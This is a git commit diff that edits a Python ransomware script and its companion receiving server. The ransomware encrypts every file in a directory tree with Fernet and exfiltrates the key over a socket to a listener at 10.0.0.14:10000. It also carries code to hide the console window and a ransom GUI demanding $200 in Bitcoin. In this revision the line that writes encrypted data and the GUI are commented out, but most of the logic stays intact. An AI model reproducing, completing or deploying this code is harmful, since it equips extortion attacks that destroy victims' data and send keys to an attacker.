68602507dd4087630fdfcda0ce7bd40e738369fe
Utkarsh Prakash <utkarsh.prakash.us@gmail.com>
2019-12-24 18:01:43 -0800

    lots of changes

--- ransomware.py
+++ ransomware.py
@@ -1,30 +1,31 @@
 ####################################
-#		Ransom Ware
-#		
+#               Ransom Ware
+#               
 ###################################
 #
 #
-#	This payload is intended 
-#	for Windows machines
-#	Do not run this executable on a non victim machine
-#	
-#	This binary will hold all contents 
-#	of your computer hostage
-#	Made with love and care,
-#	 by yours truly <3
+#       This payload is intended 
+#       for Windows machines
+#       Do not run this executable on a non victim machine
+#       
+#       This binary will hold all contents 
+#       of your computer hostage
+#       Made with love and care,
+#        by yours truly <3
 ###################################
 
 from cryptography.fernet import Fernet
 import os
 import ctypes
 import socket
-from Tkinter import *
+import datetime, sys
+from tkinter import *
 
 def curr_user():
-	user = os.popen('whoami').read() #which user am i and strip just their name (no domain prefix)
-	user = user.split("\\", 1)[-1]
-	print(user)
-	return user
+        user = os.popen('whoami').read() #which user am i and strip just their name (no domain prefix)
+        user = user.split("\\", 1)[-1]
+        print(user)
+        return user
 
 
 def encrypt_all_dir(root_dir, key):
@@ -40,9 +41,9 @@ def encrypt_all_dir(root_dir, key):
                         o = open(os.path.join(root_dir, file), 'rb')
                         data = o.read()
                         o.close()
+                        print(file)
                         fernet = Fernet(key)
                         encrypted = fernet.encrypt(data)
-                        print(encrypted)
 
                         try:
                                 o = open(os.path.join(root_dir, file), 'wb')
@@ -51,7 +52,7 @@ def encrypt_all_dir(root_dir, key):
                         except FileNotFoundError:
                                 continue
                         o = open(os.path.join(root_dir, file), 'wb')
-                        o.write(encrypted)
+                        #o.write(encrypted)
                         o.close()
 def decrypt_all_dir(root_dir, key):
         for dirName, subDirList, fileList in os.walk(root_dir):
@@ -81,38 +82,32 @@ def decrypt_all_dir(root_dir, key):
 
 
 def send_file(file_name, host, port):
+        s = socket.socket()
+        s.connect((host, port))
 
-	BUFFER_SIZE = 4096
-
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-	file_size = os.path.getsize(file_name)
-	s.connect((host, port))
-
-	s.send(f"{file_name}{seperator}{file_size}".encode())
-
-	file = open(key_name, 'rb')
-	l = file.read()
-	s.sendall(l)
-	file.close()
-
-	s.close()
-
+        file = open(file_name, "rb")
+        l = file.read(1024)
+        while(l):
+                s.send(l)
+                l = file.read(1024)
+        s.shutdown(socket.SHUT_WR)
+        file.close()
+        s.close()
+        
 def main():
-        btc_addr = '31q9PEB4if6qHX9xSif5UUe4J9pybFGcjM'
-	#hide the console window
-	#"""
-	#kernel32 = ctypes.WinDLL('kernel32')
-	#user32 = ctypes.WinDLL('user32')
-	#SW_HIDE = 0
-	#window = kernel32.GetConsoleWindow()
-	#user32.ShowWindow(window, SW_HIDE)
-	#"""
-	#generate key then write a file named after the ip of the machine
-	# file saved as xx-xx-xxx-xx.key
-        key = Fernet.generate_key()
-        key_name = "testing" #os.popen('nslookup myip.opendns.com. resolver1.opendns.com').read()
-        key_name = key_name.replace('.', '-') + '.key'
+        btc_addr = ''
+        #hide the console window
+        #"""
+        #kernel32 = ctypes.WinDLL('kernel32')
+        #user32 = ctypes.WinDLL('user32')
+        #SW_HIDE = 0
+        #window = kernel32.GetConsoleWindow()
+        #user32.ShowWindow(window, SW_HIDE)
+        #"""
+        #generate key then write a file named after the ip of the machine
+        # file saved as xx-xx-xxx-xx.key
+        #key = Fernet.generate_key()
+        key_name = "key" #os.popen('nslookup myip.opendns.com. resolver1.opendns.com').read()
 
         f = open(key_name, "rb")
         key = f.read()
@@ -122,25 +117,24 @@ def main():
         print(target_dir)
         print(key)
         #encrypt_all_dir(target_dir, key)
+        send_file(key_name, '10.0.0.14', 10000)
+        #delete the key file
+        #os.remove(key_name)
 
-	#send_file(key_name, '10.0.0.14', 10000)
-	#delete the key file
-	#os.remove(key_name)
-
-class GUI:
-        def __init__(self, master)
-        self.master = master
-        master.title = "Merry Christmas"
-        self.label = Label(master,text="This is my first GUI, and im using it to steal your money")
-        self.label.pack()
-
-        self.label1 = Label(master, text="Pay $200 to" + btc_addr)
+#class GUI:
+#        def __init__(self, master)
+#        self.master = master
+#        master.title = "Merry Christmas"
+#        self.label = Label(master,text="This is my first GUI, and im using it to steal your money")
+#        self.label.pack()
+#
+#        self.label1 = Label(master, text="Pay $200 to" + btc_addr)
 
 #main()
 #root = Tk()
 #gui = GUI(root)
 #root.mainloop()
-if __name__ = '__main__':
+if __name__ == '__main__':
         main()
 
 
--- server.py
+++ server.py
@@ -1,58 +1,32 @@
 import socket
-import tqdm
 import os
-from _thread import *
-import threading
-
-print_lock = threading.Lock()
-def threaded(c):
-	recieved = client_socket.recv(buffer_size).decode()
-	filename, filesize = recieved.split(seperator)
-	filename = os.path.basename(filename)
-	filesize = int(filesize)
-
-	progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
-	with open(filename, "wb") as f:
-	    for _ in progress:
-	        # read 1024 bytes from the socket (receive)
-	        bytes_read = client_socket.recv(BUFFER_SIZE)
-	        if not bytes_read:    
-	            # nothing is received
-	            # file transmitting is done
-	            break
-	        # write to the file the bytes we just received
-	        f.write(bytes_read)
-	        # update the progress bar
-	        progress.update(len(bytes_read))
-
-	# close the client socket
-	client_socket.close()
-
-
-
+import sys
 
 
 def Main():
 
-	server_host - '0.0.0.0'
 
-	server_port = 10000
-	buffer_size = 4096
 
-	seperator = "<seperator>"
-
-	s = socket.socket()
-
-	s.bind((server_host, server_port))
-	s.listen(5)
-
-	print(f"[*] listening {server_host}:{server_port}")
-	while True:
-		client_socket, address = s.accept()
-		print_lock.acquire()
-		print(f"[+] {address} is connected")
-
-		start_new_thread(threaded, (client_socket,))
+	host = '0.0.0.0'
+	port = 10000
 	
-	# close the server socket
-	s.close()
+	s = socket.socket()
+	s.bind((host, port))
+	print("started listening")
+	s.listen(1)
+	while True:
+		c, addr = s.accept()
+		print("connection from: " + addr[0])
+		filename = addr[0].replace('.', '-') + '.key'
+		file = open(filename, "wb")
+		while True:
+			data = c.recv(1024)
+			if not data:
+				break
+			file.write(data)
+		print("from connected user: " + filename)
+		myfile = open(filename, "rb")
+		c.close()
+
+if __name__ == '__main__':
+	Main()
